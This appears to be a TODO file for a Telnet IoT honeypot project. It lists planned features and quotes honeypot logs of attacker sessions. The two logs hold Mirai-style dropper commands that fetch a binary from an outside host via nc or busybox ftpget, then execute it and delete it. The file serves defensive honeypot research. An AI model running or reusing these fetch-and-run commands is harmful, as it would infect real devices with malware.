# Telnet IoT honeypot TODO

## Small

### clean up html/php frontend
### auto update Malware Scan Results from virustotal (done by virustotal_fill_db.py for now)
### nc support

	2017-01-06 01:46:47   main.py:214        # enable^@
	2017-01-06 01:46:48   main.py:214        # system^@
	2017-01-06 01:46:48   main.py:214        # shell^@
	2017-01-06 01:46:49   main.py:214        # cd /tmp ; nc 154.16.3.202 1337 > bin ; chmod 777 bin ; ./bin ; rm -rf bin^@
	2017-01-06 01:46:49   main.py:214        # sh^@
	2017-01-06 01:46:50   main.py:214        # /bin/busybox FBI^@

### ftpget support

	2017-01-06 01:30:23   main.py:214        # enable
	2017-01-06 01:30:23   main.py:214        # system
	2017-01-06 01:30:24   main.py:214        # shell
	2017-01-06 01:30:25   main.py:214        # sh
	2017-01-06 01:30:25   main.py:214        # /bin/busybox MIRAI
	2017-01-06 01:30:26   main.py:214        # cd /var/tmp;cd /tmp;rm -f *;busybox ftpget securityupdates.us f f;sh f;ftpget securityupdates.us f f;sh f &

## Big

### Client/Server Modell

*Idea*
client (the real honeypot) runs as a telnet server (as now) but all conns and urls are just pushed do a db server, downloading and "analyzing" the binaries.

*PRO*
More servers than one possible (to increase the surface to catch connections)

*CONTRA*
I so not have more than one public IP, so multiple honeypots are useless + Multple IP's can be served via Firewall rules
